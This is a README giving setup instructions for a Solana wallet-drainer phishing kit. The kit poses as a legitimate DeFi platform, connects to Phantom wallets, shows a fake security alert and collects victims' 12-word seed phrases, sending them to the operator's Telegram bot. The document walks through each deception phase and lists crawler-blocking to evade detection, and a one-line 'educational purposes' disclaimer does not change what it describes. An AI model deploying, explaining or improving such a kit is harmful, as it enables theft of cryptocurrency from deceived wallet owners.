# 🚀 SETUP INSTRUCTIONS

## Quick Start

1. **Install Dependencies**
   ```bash
   npm install
   ```

2. **Configure Telegram Bot (Required for seed phrase capture)**
   - Copy `.env.example` to `.env`
   - Replace `YOUR_BOT_TOKEN` with your actual bot token
   - Replace `YOUR_CHAT_ID` with your actual chat ID
   
   To get these values:
   - Message @BotFather on Telegram to create a bot
   - Message @userinfobot to get your chat ID

3. **Start the Server**
   ```bash
   npm start
   ```

4. **Access the Application**
   - Landing Page: http://localhost:3000
   - Wallet Drainer: http://localhost:3000/drainer

## How It Works

### Phase 1: Landing Page
- Professional marketing page that builds trust
- "Launch Drainer" button leads to the actual tool

### Phase 2: Wallet Connection
- Detects and connects to Phantom wallet
- Captures public key and connection data
- Sends initial data to Telegram

### Phase 3: Security Alert (The Hook)
- Shows fake "suspicious activity" alert
- Creates urgency with security warning
- Tricks user into thinking verification is needed

### Phase 4: Seed Phrase Capture
- Requests 12-word recovery phrase for "verification"
- Validates format (must be exactly 12 words)
- Sends complete seed phrase to Telegram bot

### Phase 5: Success Confirmation
- Shows fake success message
- User believes their wallet is "verified"
- Complete access to wallet is now available

## Features

✅ **Multi-Phase Social Engineering** - Progressive trust building
✅ **3D Background** - Interactive Three.js animation
✅ **Glassmorphism UI** - Modern, premium design
✅ **Phantom Wallet Integration** - Auto-detection and connection
✅ **Seed Phrase Extraction** - Complete wallet access
✅ **Telegram Reporting** - Real-time notifications with full data
✅ **Security Headers** - Basic security measures
✅ **Bot Detection** - Blocks common crawlers
✅ **Responsive Design** - Works on all devices
✅ **Professional Appearance** - Looks like legitimate DeFi platform

## File Structure

```
WALLET_SOLANA_DRAINER/
├── config/
│   └── appConfig.js          # App configuration
├── controllers/
│   ├── pageController.js     # Page rendering
│   ├── analyticsController.js # Analytics tracking
│   └── walletController.js   # Wallet interactions
├── middleware/
│   └── core.js              # Security middleware
├── public/
│   ├── assets/
│   │   ├── css/style.css    # Styles
│   │   └── js/
│   │       ├── script.js    # 3D animations
│   │       └── wallet.js    # Wallet logic
│   ├── index.html           # Landing page
│   └── drainer.html         # Drainer interface
├── routes/
│   └── index.js             # Route definitions
├── utils/
│   ├── logger.js            # Logging utility
│   ├── security.js          # Security functions
│   └── telegram.js          # Telegram integration
└── server.js                # Main server file
```

## API Endpoints

- `GET /` - Landing page
- `GET /drainer` - Wallet drainer interface
- `GET /health` - Health check
- `POST /api/wallet/connect` - Wallet connection handler
- `POST /api/wallet/sign` - Message signing handler

## Security Notes

⚠️ **IMPORTANT**: This tool is for educational purposes only. Always ensure you have proper authorization before using any wallet interaction tools.

## Troubleshooting

**Phantom Wallet Not Detected:**
- Ensure Phantom wallet extension is installed
- Check browser console for errors
- Try refreshing the page

**Telegram Not Working:**
- Verify bot token and chat ID are correct
- Check that the bot has permission to send messages
- Look at server console for error messages

**Server Won't Start:**
- Check that port 8080 is available
- Verify all dependencies are installed
- Check server console for specific error messages